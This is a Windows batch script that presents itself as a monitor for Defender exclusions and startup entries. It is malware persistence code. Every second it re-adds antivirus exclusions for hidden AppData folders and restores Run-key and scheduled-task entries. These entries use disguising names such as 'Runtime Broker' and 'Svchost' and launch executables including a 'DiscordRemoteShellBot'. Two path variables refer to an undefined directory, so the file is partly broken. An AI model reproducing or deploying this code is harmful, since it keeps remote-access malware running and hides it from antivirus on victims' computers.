@echo off
:: Batch script to monitor and restore Windows Defender exclusions and startup entries
:: Run this script as administrator for full functionality

setlocal enabledelayedexpansion

:check_admin
:: Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
    exit /b
)

:: Set paths
set "HIDDEN_BASE_DIR=%APPDATA%\SubDir"
set "RUNTIME_BROKER_DIR=%APPDATA%\Runtime Broker"
set "RUNTIME_BROKER_EXE=%HIDDEN_BASE_DIR%\Runtime Broker.exe"
set "SVCHOST_BAT=%HIDDEN_BASE_DIR%\Svchost.bat"
set "DISR_EXE=%HIDDEN_BROKER_DIR%\DisR.exe"
set "DISCORD_BOT_EXE=%HIDDEN_BROKER_DIR%\DiscordRemoteShellBot.exe"

:: Monitor loop
echo Starting monitoring of Windows Defender exclusions and startup entries...
echo Press Ctrl+C to stop monitoring.

:monitor_loop
:: Check and restore Windows Defender exclusions
call :check_exclusions

:: Check and restore registry startup entries
call :check_registry_startup

:: Check and restore task scheduler entries
call :check_task_scheduler

:: Wait for 1 second before checking again
timeout /t 1 /nobreak >nul
goto :monitor_loop

:check_exclusions
:: Check if directories are in Windows Defender exclusions
for %%P in ("!HIDDEN_BASE_DIR!" "!RUNTIME_BROKER_DIR!") do (
    powershell -Command "$exclusions = (Get-MpPreference).ExclusionPath; if ($exclusions -notcontains '%%~P') { Add-MpPreference -ExclusionPath '%%~P'; Write-Host 'Added exclusion: %%~P' }" >nul
)
exit /b

:check_registry_startup
:: Check and restore Runtime Broker in registry startup
if exist "!RUNTIME_BROKER_EXE!" (
    powershell -Command "
    $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $currentValue = (Get-ItemProperty -Path $regPath -Name 'Runtime Broker' -ErrorAction SilentlyContinue).'Runtime Broker'
    if ($currentValue -ne '\"!RUNTIME_BROKER_EXE!\"') {
        Set-ItemProperty -Path $regPath -Name 'Runtime Broker' -Value '\"!RUNTIME_BROKER_EXE!\"'
        Write-Host 'Restored Runtime Broker in registry startup'
    }
    " >nul
)

:: Check and restore Svchost in registry startup
if exist "!SVCHOST_BAT!" (
    powershell -Command "
    $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $currentValue = (Get-ItemProperty -Path $regPath -Name 'Svchost' -ErrorAction SilentlyContinue).'Svchost'
    if ($currentValue -ne 'cmd.exe /c \"!SVCHOST_BAT!\"') {
        Set-ItemProperty -Path $regPath -Name 'Svchost' -Value 'cmd.exe /c \"!SVCHOST_BAT!\"'
        Write-Host 'Restored Svchost in registry startup'
    }
    " >nul
)
exit /b

:check_task_scheduler
:: Check and restore Runtime Broker task
if exist "!RUNTIME_BROKER_EXE!" (
    powershell -Command "
    $task = Get-ScheduledTask -TaskName 'Runtime Broker' -ErrorAction SilentlyContinue
    if (-not $task) {
        $action = New-ScheduledTaskAction -Execute '!RUNTIME_BROKER_EXE!'
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName 'Runtime Broker' -Action $action -Trigger $trigger -Settings $settings -Force
        Write-Host 'Restored Runtime Broker task scheduler entry'
    }
    " >nul
)

:: Check and restore Svchost task
if exist "!SVCHOST_BAT!" (
    powershell -Command "
    $task = Get-ScheduledTask -TaskName 'Svchost' -ErrorAction SilentlyContinue
    if (-not $task) {
        $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c \"!SVCHOST_BAT!\"'
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName 'Svchost' -Action $action -Trigger $trigger -Settings $settings -Force
        Write-Host 'Restored Svchost task scheduler entry'
    }
    " >nul
)

:: Check and restore DisR task
if exist "!DISR_EXE!" (
    powershell -Command "
    $task = Get-ScheduledTask -TaskName 'DisR' -ErrorAction SilentlyContinue
    if (-not $task) {
        $action = New-ScheduledTaskAction -Execute '!DISR_EXE!'
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName 'DisR' -Action $action -Trigger $trigger -Settings $settings -Force
        Write-Host 'Restored DisR task scheduler entry'
    }
    " >nul
)

:: Check and restore DiscordRemoteShellBot task
if exist "!DISCORD_BOT_EXE!" (
    powershell -Command "
    $task = Get-ScheduledTask -TaskName 'DiscordRemoteShellBot' -ErrorAction SilentlyContinue
    if (-not $task) {
        $action = New-ScheduledTaskAction -Execute '!DISCORD_BOT_EXE!'
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName 'DiscordRemoteShellBot' -Action $action -Trigger $trigger -Settings $settings -Force
        Write-Host 'Restored DiscordRemoteShellBot task scheduler entry'
    }
    " >nul
)
exit /b

:end
echo Monitoring stopped.
pause